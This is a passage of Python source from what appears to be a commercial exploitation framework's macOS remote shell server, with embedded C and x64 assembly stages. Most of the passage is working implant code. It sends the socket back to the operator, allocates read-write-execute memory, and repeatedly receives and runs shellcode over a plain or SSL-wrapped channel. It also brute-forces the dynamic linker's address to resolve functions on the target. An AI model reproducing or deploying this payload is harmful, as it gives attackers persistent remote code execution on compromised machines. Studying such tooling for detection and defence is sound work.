        #import "int",    "F_SETFL"     as "F_SETFL"
        #import "int",    "F_GETFL"     as "F_GETFL"
        #import "int",    "O_NONBLOCK"  as "O_NONBLOCK"
        #import "int",    "O_BLOCK"     as "O_BLOCK"
        
        #import "int",    "PROT_READ"   as "PROT_READ"
        #import "int",    "PROT_WRITE"  as "PROT_WRITE"
        #import "int",    "PROT_EXEC"   as "PROT_EXEC"
        #import "int",    "MAP_PRIVATE" as "MAP_PRIVATE"
        #import "int",    "MAP_ANON"    as "MAP_ANON"
        #import "int",    "MAP_FAILED"  as "MAP_FAILED"

        struct timeval {
            int sec;
            int usec;
        };
 
        void main()
        {
            void *m;
            void *ctx;
            void *ssl;
            void *method;
            char *p;

            int ret;
            int len;
            int left;
            
            int timeout;
            int connected;
            int opts;

            struct timeval tv;

            
            SSL_library_init();
            method = SSLv3_method();
            
            ctx = SSL_CTX_new(method);
            ssl = SSL_new(ctx);

            sendpointer(ssl);
            SSL_set_fd(ssl, FD);

            // Turn on non-blocking mode since SSL_connect can block forever
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts | O_NONBLOCK;
            fcntl(FD, F_SETFL, opts);

            timeout   = 0;
            connected = 0;
            
            do {
                tv.sec  = 1;
                tv.usec = 0;
                
                ret = SSL_connect(ssl);

                if (ret == 1) {
                    connected = 1;
                } else {
                    ret = select(NULL, NULL, NULL, NULL, &tv);
                    timeout = timeout + 1;

                    if (ret == -1) {
                        connected = 2;
                    }
                    
                    if (timeout == TIMEOUT) {
                        connected = 2;
                    }
                }
            } while (connected == 0);


            // Turn off non-blocking mode
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts & O_BLOCK;
            fcntl(FD, F_SETFL, opts);

            if (connected != 1) {
                // Handshake error, need to resynchronize
                // if we want to keep connection/mosdef loop going
                sendint(2864434397);

                do {
                    p = &connected;
                    left = 4;
                    do {
                        ret = read(FD, p, left);

                        if (ret < 0) {
                            exit(1);
                        }

                        left = left - ret;
                        p = p + ret;
                    } while (left > 0);
     
                } while (connected != 2864434397);
                return;
            }

            // This is the upgraded SSL MOSDEF loop
            while (1) {
                ret  = 0;
                len  = 0;
                left = 4;
                p    = &len;

                do {
                    ret = SSL_read(ssl, p, left);

                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p    = p + ret;
                } while (left > 0);

                m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);

                if (m == MAP_FAILED) {
                    exit(1);
                }

                p = m;
                left = len;
                
                do {
                    ret = SSL_read(ssl, p, left);
                    
                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p = p + ret;
                } while (left > 0);
                
                callptr(m);
                munmap(m, len);
            }
            
            exit(0);
        }
        """

        try:
            self.log('Turning on crypto..')
            self.savefunctioncache()
            self.clearfunctioncache()
            request = self.compile(code, vars)
            self.restorefunctioncache()
            self.sendrequest(request)

            self.ssl_ptr = self.readpointer()
            
            self.leave()
            self.log('SSL pointer: 0x%x' % self.ssl_ptr)
        except ResolveException, ex:
            self.log(str(ex))
            self.log('Aborting crypto setup')
            return False

        return True
        

    def is_dyld(self, address):
        """
        Given `address' return True if DYLD is mapped there.
        Return False otherwise.
        """
        vars = {}
        vars['address'] = address

        code = """
        #import "local", "access" as "access"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "int",   "address" as "ADDRESS"

        void main()
        {

        int ret;
        void *ptr;
        ptr = ADDRESS;
        
        ret = access(ptr, 4);

        if (ret == 14) {
            sendint(0);
            return;
        }
        
        if (*ptr != 0xfeedface) {
           sendint(0);
           return;
        }

        ptr = ptr + 3;        
        if (*ptr != 0x7) {
            sendint(0);
            return;
        }

        sendint(1);
        }
        """

        self.savefunctioncache()
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.restorefunctioncache()
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return True if ret else False


    def find_dyld(self, base):
        """
        This will do a 1-byte bruteforce memory search for DYLD.
        On success, return DYLD base address.
        On failure, return 0.
        """
        
        vars = {}
        vars['start'] = base

        code = """
        #import "local", "access" as "access"
        #import "local", "sendint" as "sendint"
        #import "int",   "start" as "BASE"

        void main()
        {

        int i;
        int k;
        int ret;

        void *ptr;

        int addr;
        int start;

        start = BASE;

        for (i=0; i<=255; i=i+1) {
            k = i << 12;
            addr = start | k;
            ptr  = addr;

            ret = access(ptr, 4); // R_OK

            if (ret != 14) { // EFAULT
                if (*ptr == 0xfeedface) {
                    ptr = ptr + 3;

                    
                    if (*ptr == 0x7) { // MH_DYLINKER
                        sendint(addr);
                        return;
                    }
                }
            }
        }

        addr = 0;
        sendint(addr);
        }
        """

        self.savefunctioncache()
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.restorefunctioncache()
        self.sendrequest(request)
        ret = self.readint()
        self.leave()
        return ret

    
    # OSX Remote resolving functionality
    def getprocaddress_primitive(self, function, dyld_base):
        """
        Resolves a symbol using the primitive resolver in osxremoteresolver
        
        We are only calling this function to resolve _dlopen and _dlsym
        (in startup()) and setup the local functions (dlopen/dlsym) which 
        getprocaddress_real subsequently uses for all resolutions
        """

        vars = {}
        vars['function']  = function
        vars['dyld_base'] = dyld_base
        
        code="""
        #import "local", "sendint" as "sendint"
        #import "local", "resolve" as "resolve"

        #import "string", "function" as "function"
        #import "int",    "dyld_base" as "DYLD_BASE"
        
        void main()
        {
        unsigned int i;
        i = resolve(function, DYLD_BASE);
        sendint(i);
        }
        """
        
        self.savefunctioncache()
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.restorefunctioncache()
        self.sendrequest(request)
        ret = uint32(self.readint())
        self.leave()            
        return ret

    def clearfunctioncache(self):
        self.remoteFunctionsUsed = {}
        x86osxremoteresolver.clearfunctioncache(self)
        return

    def readpointer(self):
        return self.readint()
        

class OSX_x64(OSXShellServer, x64osxremoteresolver):    
    COMPILE_ARCH = 'X64'
    
    def __init__(self, connection, node, logfunction=None, proctype='x64'):
        self.LP64=True
        x64osxremoteresolver.__init__(self) # now we have a libc ..
        OSXShellServer.__init__(self)
        unixshellserver.__init__(self, connection, type='Active', logfunction=logfunction)
        #TODO: check for this proctype, it seems that uses it to check if it is big endian
        MSSgeneric.__init__(self, proctype)

        self.node       = node
        self.node.shell = self
        self.started    = 0
        self.order      = intel_order
        self.unorder    = istr2int
        self.connection = connection

        self.DYLD_OLD_BASE      =  0x7fff5fc00000
        self.DYLD_BRUTE_BASE_1  =  0x7fff50000000
        self.DYLD_BRUTE_BASE_2  =  0x7fff60000000

    def startup(self):        
        if self.started == True:
            return 0
        
        devlog('shellserver::startup', 'osx shellserver starting up ..')
        devlog('shellserver::startup', 'local: %s, remote: %s' % \
               (self.connection.getsockname(), self.connection.getpeername()))
        
        self.connection.set_timeout(None)
        
        # get the fd val .. left in rbx .. rbx is PIC code reg in OS X
        import MOSDEF.mosdef as mosdef
        import struct

        send_fd_mmap_loop = """
        // stack should be aligned by first stage
        // TODO: remove this alignement
        andl $-16,%rsp
        //fd is on r15

        //int3
        //here we start
        //align
        pushq %rax

        //send the fd(sock) back to CANVAS
        movq %r15,%rdi
        pushq %r15
        movq %rsp,%rsi
        movq $0x4,%rdx
        movq $0x2000004,%rax // SYS_write
        syscall

        // stack
        popq %rax
        popq %rax

        // mmap 4k
        movq $0x20000c5,%rax // SYS_mmap
        xor %rdi,%rdi        // address
        movq $0x4000,%rsi    // size
        movq $0x7,%rdx       // prot: RWX
        movq $0x1002,%r10    // flags
        xor %r8,%r8          // fildes
        dec %r8d
        xor %r9,%r9          // off
        syscall

        //these both are supposed to be saved by called functions
        movq %rax,%r12 //mmap return

    recv_exec:

        //read
        pushq %rax //align
        pushq %rax //data read
        movq %rsp,%rsi
        movq $0x4,%rdi
        call recvloop

        popq %rdx //get size
        mov  %edx,%edx //cut to 32bit
        popq %r8  //align
        
        test %rax,%rax
        jz ret_to_prev
        
    read_exec:

        movq $0x2000003,%rax // SYS_read
        movq %rdx,%rdi
        movq %r12,%rsi //mmap address
        call recvloop

        push %r15 //save
        push %r12

        call *%r12 // MOSDEF

        pop %r12  //restore and align
        pop %r15
        jmp recv_exec

    recvloop:
        push %r12
        push %r13
        movq %rdi,%r12 //len
        movq %rsi,%r13 //buff

    recvloop_one:
        movq %r15,%rdi                 // socket
        movq %r13,%rsi                 // buffer
        movq %r12,%rdx                 // length
        movq $0x2000003,%rax           // SYS_read
        syscall
        
        cmp $0,%eax
        jg no_recv_error
        
        // TODO: same as before, we need errno
        //EINTR
        
        jmp exit
    no_recv_error:
        sub %rax,%r12
        add %rax,%r13
        test %r12,%r12
        jne recvloop_one
        
        pop %r13
        pop %r12
        ret

    exit:
        xor %rdi,%rdi        // status
        movq $0x2000001,%rax // SYS_exit
        syscall

    ret_to_prev:
        ret
        """
            
        self.sendrequest(mosdef.assemble(send_fd_mmap_loop, self.COMPILE_ARCH))
        self.fd = struct.unpack('<L', self.connection.recv(4))[0]
        self.leave()
        self.set_fd(self.fd)
        self.libc.initStaticFunctions({'fd': self.fd}) # update libc functions that require fd val
        self.localfunctions = copy.deepcopy(self.libc.localfunctions) # update our rr copy of the libc
        self.initLocalFunctions()

        devlog('shellserver::startup', 'remote fd: %d' % self.fd)        

        self.setInfo('OSX ShellServer started on: %s (remote fd: %d)' % (self.connection.getpeername(), self.fd))        
        self.started = True

        # Find DYLD
        self.log('Looking for DYLD..')

        dyld = 0
        
        # First check fixed address that is used in older OSX versions
        if self.is_dyld(self.DYLD_OLD_BASE):
            dyld = self.DYLD_OLD_BASE
        else:
            # Bruteforce
            for base in (self.DYLD_BRUTE_BASE_1, self.DYLD_BRUTE_BASE_2):
                self.log('Bruteforcing address: 0x%x' % base)
                dyld = self.find_dyld(base)
                if dyld: break

        if not dyld:
            # Shouldn't happen
            self.log('Could not resolve DYLD, resolving functionality will be missing')
            
        else:
            self.log('Found DYLD at: 0x%x' % dyld)
            
            # Resolve _dlopen and _dlsym
            found = True
            for i in ('_dlopen', '_dlsym'):
                if i not in self.remotefunctioncache:
                    address = self.getprocaddress_primitive(i, dyld)
                    if address != 0:
                        self.remotefunctioncache[i] = address
                        devlog('shellserver', 'resolved %s: 0x%x' % (i, address))
                    else:
                        found = False
                        devlog('shellserver', 'Could not resolve %s' % i)

            if found: self.remote_resolver = True

        # Try and upgrade to SSL
        if not isinstance(self.connection, MOSDEFSock) and CanvasConfig['ssl_mosdef'] and self.do_ssl():
            old_connection = self.connection
            
            try:
                self.connection = ssl.wrap_socket(self.connection._sock, server_side=True,
                                                  certfile=os.path.join(RESOURCE, 'mosdefcert.pem'),
                                                  do_handshake_on_connect=False,
                                                  ssl_version=ssl.PROTOCOL_SSLv3)
                self.log('SSL handshake..')
                
                self.connection.settimeout(20)
                self.connection.do_handshake()
                self.log('Encrypted connection established')

                # Replace write with SSL-enabled write
                self.localfunctions["write"] = ("c", """
                #import "remote64", "libssl.dylib|SSL_write" as "SSL_write"
                #import "local",  "syscall3" as "syscall3"
                
                int write(int fd, char *buf, int nbytes)
                {

                    int retval;

                    if (fd == FD) {
                        retval = SSL_write(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_write, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Replace read with SSL-enabled read
                self.localfunctions["read"] = ("c", """
                #import "remote64", "libssl.dylib|SSL_read" as "SSL_read"
                #import "local", "syscall3" as "syscall3"
                #import "local", "debug" as "debug"


                int read(int fd, char *buf, int nbytes)
                {
                    int retval;

                    if (fd == FD) {
                        retval = SSL_read(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_read, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Monkey patch the new SSL connection instance to add set_timeout method
                # that will simply call the python socket timeout method
                self.connection.set_timeout = types.MethodType(lambda s, t: s.settimeout(t), self.connection)

            except ssl.SSLError, ex:
                self.log(str(ex))
                self.log('Handshake failed, aborting crypto setup')
                self.log('Attempt to synchronize connection..')
                self.connection = old_connection
                                
                buf   = []
                
                while True:
                    byte = self.connection.recv(1)
                    
                    if not byte:
                        # Connection closed
                        self.log('Connection closed, aborting ShellServer startup')
                        return 0

                    buf.append(byte)

                    if ''.join(buf[-4:]) == '\xdd\xcc\xbb\xaa':
                        # We have our trigger
                        self.log('Re-synchronized connection, continuing with normal MOSDEF')
                        # Send trigger to remote end
                        self.connection.sendall('\xdd\xcc\xbb\xaa')
                        break

        return self.started


    def do_ssl(self, timeout=10):
        """
        Try and upgrade the existing TCP MOSDEF connection to an encrypted SSL.

        There is some trickery involved here, mainly to do with the fact that
        SSL_connect can block for ever (even on errors), so we need to do everything
        in non-blocking mode, measure elapsed time and bail out if it gets to be
        too long.

        TIMEOUT is maximum time in seconds that we will spend in the SSL handshake.
        """
        
        vars = self.libc.getdefines()

        vars['FD']      = self.fd
        vars['TIMEOUT'] = timeout
        
        code = """        
        #import "remote64", "libssl.dylib|SSL_library_init"       as "SSL_library_init"
        #import "remote64", "libssl.dylib|SSL_CTX_new"            as "SSL_CTX_new"
        #import "remote64", "libssl.dylib|SSLv3_method"           as "SSLv3_method"
        #import "remote64", "libssl.dylib|SSL_new"                as "SSL_new"
        #import "remote64", "libssl.dylib|SSL_set_fd"             as "SSL_set_fd"
        #import "remote64", "libssl.dylib|SSL_connect"            as "SSL_connect"
        #import "remote64", "libssl.dylib|SSL_read"               as "SSL_read"
        #import "remote64", "libssl.dylib|SSL_write"              as "SSL_write"
        #import "remote64", "libssl.dylib|SSL_get_error"          as "SSL_get_error"
        
        #import "remote64",  "libSystem.dylib|select"             as "select"

        #import "local",  "read"        as "read"
        #import "local",  "fcntl"       as "fcntl"
        #import "local",  "sendint"     as "sendint"
        #import "local",  "sendpointer" as "sendpointer"
        #import "local",  "munmap"      as "munmap"
        #import "local",  "mmap"        as "mmap"
        #import "local",  "exit"        as "exit"
        #import "local",  "callptr"     as "callptr"
        #import "local",  "malloc"      as "malloc"
        #import "local",  "memset"      as "memset"
        #import "local",  "debug"       as "debug"

        #import "int",    "FD"          as "FD"
        #import "int",    "F_SETFL"     as "F_SETFL"
        #import "int",    "F_GETFL"     as "F_GETFL"
        #import "int",    "O_NONBLOCK"  as "O_NONBLOCK"
        #import "int",    "O_BLOCK"     as "O_BLOCK"

        #import "int",    "PROT_READ"   as "PROT_READ"
        #import "int",    "PROT_WRITE"  as "PROT_WRITE"
        #import "int",    "PROT_EXEC"   as "PROT_EXEC"
        #import "int",    "MAP_PRIVATE" as "MAP_PRIVATE"
        #import "int",    "MAP_ANON"    as "MAP_ANON"
        #import "int",    "MAP_FAILED"  as "MAP_FAILED"

        struct timeval {
            int sec;
            int usec;
        };

        void main()
        {
            void *m;
            void *ctx;
            void *ssl;
            void *method;
            char *p;

            int ret;
            int len;
            int left;
 
            int timeout;
            int connected;
            int opts;

            struct timeval tv;

            
            SSL_library_init();
            method = SSLv3_method();
            
            ctx = SSL_CTX_new(method);
            ssl = SSL_new(ctx);

            sendpointer(ssl);            
            SSL_set_fd(ssl, FD);

            // Turn on non-blocking mode since SSL_connect can block forever
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts | O_NONBLOCK;            
            fcntl(FD, F_SETFL, opts);

            timeout   = 0;
            connected = 0;

            do {
                tv.sec  = 1;
                tv.usec = 0;
                
                ret = SSL_connect(ssl);

                if (ret == 1) {
                    connected = 1;
                } else {
                    ret = select(NULL, NULL, NULL, NULL, &tv);
                    timeout = timeout + 1;

                    if (ret == -1) {
                        connected = 2;
                    }

                    if (timeout == TIMEOUT) {
                        connected = 2;
                    }
                }
            } while (connected == 0);


            // Turn off non-blocking mode
            opts = fcntl(FD, F_GETFL, 0);
            opts = opts & O_BLOCK;
            fcntl(FD, F_SETFL, opts);

            if (connected != 1) {
                // Handshake error, need to resynchronize
                // if we want to keep connection/mosdef loop going
                sendint(2864434397);

                do {
                    p = &connected;
                    left = 4;

                    do {
                        ret = read(FD, p, left);

                        // Abort here
                        if (ret < 0) {
                            exit(1);
                        }

                        left = left - ret;
                        p = p + ret;
                    } while (left > 0);
                    
                } while (connected != 2864434397);
                
                return;
            }

            // This is the upgraded SSL MOSDEF loop
            while (1) {
                ret  = 0;
                len  = 0;
                left = 4;
                p = &len;

                do {
                    ret = SSL_read(ssl, p, left);

                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p = p + ret;
                } while (left > 0);
                    

                m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);

                if (m == MAP_FAILED) {
                    exit(1);
                }

                p = m;
                left = len;

                do {
                    ret = SSL_read(ssl, p, left);
                    if (ret <= 0) {
                        exit(1);
                    }

                    left = left - ret;
                    p = p + ret;
                } while (left > 0);
                
                callptr(m);
                munmap(m, len);
            }
            
            exit(0);
        }
        """

        try:
            self.log('Turning on crypto..')
            self.savefunctioncache()
            self.clearfunctioncache()
            request = self.compile(code, vars)
            self.restorefunctioncache()
            self.sendrequest(request)

            self.ssl_ptr = self.readpointer()
            
            self.leave()
            self.log('SSL pointer: 0x%x' % self.ssl_ptr)
        except ResolveException, ex:
            self.log(str(ex))
            self.log('Aborting crypto setup')
            return False

        return True


    def find_dyld(self, base):
        """
        This will do a 2-byte bruteforce memory search for DYLD.
        On success, return DYLD base address.
        On failure, return 0.
        """
        
        vars = {}
        vars['start'] = base

        code = """
        #import "local", "access" as "access"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "long long", "start" as "BASE"

        void main()
        {

        int i;
        int k;
        int ret;

        void *ptr;

        long long addr;
        long long start;

        start = BASE;

        for (i=0; i<=65535; i=i+1) {
            k = i << 12;
            addr = start | k;
            ptr  = addr;

            ret = access(ptr, 4); // R_OK

            if (ret != 14) { // EFAULT
                if (*ptr == 0xfeedfacf) {
                    ptr = ptr + 3;

                    
                    if (*ptr == 0x7) { // MH_DYLINKER
                        sendlonglong(addr);
                        return;
                    }
                }
            }
        }

        addr = 0;
        sendlonglong(addr);
        }
        """

        self.savefunctioncache()
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.restorefunctioncache()
        self.sendrequest(request)
        ret = self.readlonglong()
        self.leave()
        return ret
        

    def is_dyld(self, address):
        """
        Given `address' return True if DYLD is mapped there.
        Return False otherwise.
        """

        vars = {}
        vars['address'] = address

        code = """
        #import "local", "access" as "access"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "long long", "address" as "ADDRESS"

        void main()
        {

        int ret;
        void *ptr;

        ptr = ADDRESS;
        ret = access(ptr, 4);

        if (ret == 14) {
            sendint(0);
            return;
        }

        
        if (*ptr != 0xfeedfacf) {
           sendint(0);
           return;
        }

        ptr = ptr + 3;        
        if (*ptr != 0x7) {
            sendint(0);
            return;
        }

        sendint(1);
        }
        """

        self.savefunctioncache()
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.restorefunctioncache()
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return True if ret else False


    def getprocaddress_primitive(self, function, dyld_base):
        """
        Resolves a symbol using the primitive resolver in osxremoteresolver
        
        We are only calling this function to resolve _dlopen and _dlsym
        (in startup()) and setup the local functions (dlopen/dlsym) which 
        getprocaddress_real subsequently uses for all resolutions
        """

        vars = {}
        vars['function']  = function
        vars['dyld_base'] = dyld_base
        
        code = """
        #import "local", "sendlonglong" as "sendlonglong"
        #import "local", "resolve" as "resolve"

        #import "string", "function" as "function"
        #import "long long", "dyld_base" as "DYLD_BASE"
        
        void main()
        {
        long long i;
        i = resolve(function, DYLD_BASE);
        sendlonglong(i);
        }
        """
        
        self.savefunctioncache()
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.restorefunctioncache()
        self.sendrequest(request)
        ret=uint64(self.readlonglong())
        self.leave()
        return ret

    def clearfunctioncache(self):
        self.remoteFunctionsUsed = {}
        x64osxremoteresolver.clearfunctioncache(self)

    def readpointer(self):
        return uint64(self.readlonglong())
        
